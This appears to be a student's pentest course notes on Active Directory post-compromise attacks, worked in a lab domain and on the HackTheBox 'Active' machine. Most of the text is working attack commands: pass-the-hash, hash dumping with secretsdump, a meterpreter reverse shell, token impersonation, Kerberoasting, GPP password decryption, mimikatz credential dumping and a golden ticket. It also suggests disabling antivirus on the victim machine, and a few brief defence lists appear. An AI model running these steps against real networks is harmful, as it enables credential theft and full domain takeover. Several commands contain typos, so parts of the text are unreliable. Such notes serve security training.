```md

[*] Post-Compromise Attacks

[*] Pass The Hash/Pass The Password

[*] For This, We Are Going To Use A Tool: crackmapexec
[*] Installation:

apt-get install crackmapexec

[*] Attacking

[*] As We Know, We Have Comromised A Machines(fcastle:Password1), We Will Use It To Attck Further
[*] Command:

crackmapexec <DomainIP>/24 -u <UserName> -d <DomainName>.local -p <Password>
crackmapexec 192.168.57.0.24 -u fcastle -d MARVEL.local -p Password1

[*] As We Can See In The Output, We Compromised Another Machine With The Same Password
[*] Lets Try To Login Using psexec.py. Success! 

[*] Lets Dump Hashes Using secretsdump.py

https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py

[*] Command:

secretsdump.py <DomainName>/<Username>:<Password>@<VictimIp>

secretsdump.py marvel/fcastle:Password1@192.168.57.141

[*] Got The Hashes! Lets Try With The Other Machine That We Accessed Using Pass The Hash

secretsdump.py marvel/fcastle:Password1@192.168.57.142

[*] Got The Hashes For This Machine Too!

[*] Cracking The Hashes(Using Hashcat)

[*] Earlier, We Cracked NTLMv2 Hash But Now, It's NTML
[*] Command(On The Host)

hashcat.exe -m 1000 <HashFile.txt> <PathToRockyou.txt> -O

[*] Got Password For Both The Users(Earier, We Got Both Machines) But We Couldnt Crack The Administrator Password(Cause Likely It Is Disabled)

[*] Pass The Hash

[*] A Typical NTLM Hash

bill:FA91C4FD28A2D257AAD3B435B51404EE:FF2A43841C84518A18795AB6E3C8A62E:::

[*] Here We Only Need The Second Part

<User>:<Part1>:<Part2>:::

[*] Passing:

crackmapexec <IPRange>/24  -u "<User>" -H <HashPart2> --local
crackmapexec 192.168.57.0/24 -u "Frank Castle" -H FF2A43841C84518A18795AB6E3C8A62E --local

[*] Unsuccessful But No Problem. 

[*] Pass Attack Defences

[+] Limit Account Reuse
[+] Utilize Strong Password(>14 Characters)
[+] Privilage Access Management

[*] Token Impersonation

[*] Token = A Temporary Key That Allows Access To A System/Network

[*] Types:

[*] Delegate
[*] Impersonate

[*] Attacking:

[*] In Order To Perform This Attack, We Need Metasploit
[*] Now, Here We Will Use Psexec(In Metaspoloit) To Connect

use exploit/windows/smb/psexec

[*] Now In The Payload, We Need A Meterpreter Payload. 

set payload windows/x64/meterpreter/reverse_tcp

[*] Now:

exploit

[*] Got A Shell!(If Not, Disable Antivirus On The User Machine)
[*] Now We Have To Load A Tool

load incognito

[*] Now, The Commands. 
[*] First, Lets List Tokens

list_tokens -u

[*] Impersonating:

impersonate_token <Domain>\\<User>

impersonate_token marvel\\administrator

[*] We Are Administrator!
[*] If You Face Issues With Running Commands As Administrator, Type rev2self. This We Reverse The Process. 
[*] If You Don't See A Token For Administrator, Login To The Machine As Administrator And Thats It! You Get The Token

[*] Token Impersonation Defences

[+] Limit User/Group Token Creation Permissions
[+] Account Tiering
[+] Local Admin Restriction

[*] Kerberoasting

[*] For This Attack, We Will Use A Tool Called GetUserSPNs

https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py

[*] Command:

GetUserSPNs.py <DomainName>.local/<User>:<Password> -dc-ip <DomainControllerIP> -request
GetUserSPNs.py marvel.local/fcastle:Password1 -dc-ip 192.168.57.140 -request4

[*] We Should Immediately Get The Hash! Copy It And Lets Crack It Using Hashcat(On The Host):

hashcat.exe -m 13100 <HashFile.txt> <PathToWordlist.txt> -O

[*] Here We Go! We Got The Password For The SQLService(It Is Domain Admin Account!)

[*] Defences:

[+] Strong Password
[+] Least Privilage(Don't Make Service Accounts Domain Admin)

[*] GPP(Group Policy Preferances/MS14-025) / cPassword Attacks

[*] GPP Allowed Admins To Create Policies Using Embeded Credentials. These Credentials Were Encrypted But The Key Was Accidently Released. This Has Been Patched In The MS14-025, And Is Rarely Found In Real-Life, This Still Exists.

[*] Referance:

https://www.rapid7.com/blog/post/2016/07/27/pentesting-in-the-real-world-group-policy-pwnage/

[*] Attacking:

[*] This Is A Bit Hard To Set Up In Our Lab, So We Are Going Back To HackTheBox
[*] smb_enum_gpp Is The Module In Metasploit Which Is Used To Check If The Vulnerabity Exists

[*] So, The Box Which We Are Going To Attack Is Active(From HackTheBox)
[*] So Let's Start

[*] Scanning And Enumeration

[*] Some Ports Related To Active Directory Are Open(Like: domain, kerberos-sec, ldap, ldapssl)
[*] SMB Is Also Open

[*] Lets Connect

smbclient -L \\\\<IP>\\

[*] We Get To See 7 Shares
[*] Lets Try To Connect

[*] Attacking

[*] Got Connection To Replication(As Anonymous)
[*] Lets Run Two Commands:

prompt off
recurse on

[*] Lets List. We Get To See A Groups.xml! That's Where The cPassword Is Stored!
[*] Lets Get Them All

mget *

[*] Yes We Have The Groups.xml. Open It. And You See There Is Something After cpassword=(The Hash!). Copy It. (Note: We Also See: active.htb Which Is The Domain And SVC_TGS Which Is The Service)

gpp-decrypt <Hash>

[*] Get Got The Password! Lets Connect Using psexec

psexec.py active.htb/svc_tgs:GPPstillStandingStrong2k18@<IP>

[*] Connection Failed! We Are A Low-Privilage User!

[*] As We Have Credentials For The svc_tgs(Ticket Granting Service), Let's Kerberoast

GetUserSPNs.py active.htb/svc_tgs:GPPstillStandingStrong2k18 -dc-ip <IP> -request

[*] We Get The Ticket!

[*] Hashcat Now(On The Host):

hashcat.exe -m 13100 <HashFile.txt> <PathToRockyou.txt> -O

[*] Got The Password! Ticketmaster1968
[*] This Is An Admin Account

psexec.py active.htb/Administrator:Ticketmaster1968@<IP>

[*] Got A Shell As Authority\System

[*] Mimikatz

https://github.com/gentilkiwi/mimikatz (We Dont Need This)


[*] Mimikatz Is Used To View And Steal Passwords

https://github.com/gentilkiwi/mimikatz/releases (Download This To The Domain Controller, As We Have Compromised It)

[*] This May Show As A Harmful Site(As We Use Dangerous Codes To Hack :)

[*] Download The ZIP File

[*] Credential Dumping With mimikatz

[*] Unzip The File On The Domain Controller And Open Up A Command Prompt In The Location Of The Extracted File. Now Run:

mimikatz.exe

[*] The First Command:

privilage::debug

[*] If The Output Is Privilage '20' OK, We Are Good To Go!

[*] Dumping Credentials:

sekurlsa::loginpasswords

[*] This Will Show The Login Passwords

[*] This May Dump The Sam(Not In This Case)

lsadump::sam

[*] This Will Dump The LSA File

lsadump::lsa /patch

[*] Golden Ticket Attacks

[*] First Command:

mimikatz.exe

[*] Now:

privilage::debug

[*] Next:

lsadump::lsa /inject /name:krbtgt

[*] Now In A Text Editor, Copy The First Line After <Domainname> / <This Part> And The NTLM Hash Under Primary

[*] The Final Command:

kerberos::golden /User:<ANYNAME> /domain:<Domain>.local /sid:<The First Line That We Copied> /krbtgt:<The NTLM Hash> /id:500 /ptt

[*] Success! Lets Connect To It

misc::cmd

[*] This Should Open A Shell! Now We Can Do Anything We Want To Do!
[*] You Can Use psexec.exe To Connect To Any Machine!

[*] Active Directory, Done!

[*] References

https://adsecurity.org/
http://blog.harmj0y.net/
https://www.pentesteracademy.com/activedirectorylab
https://www.pentesteracademy.com/redteamlab
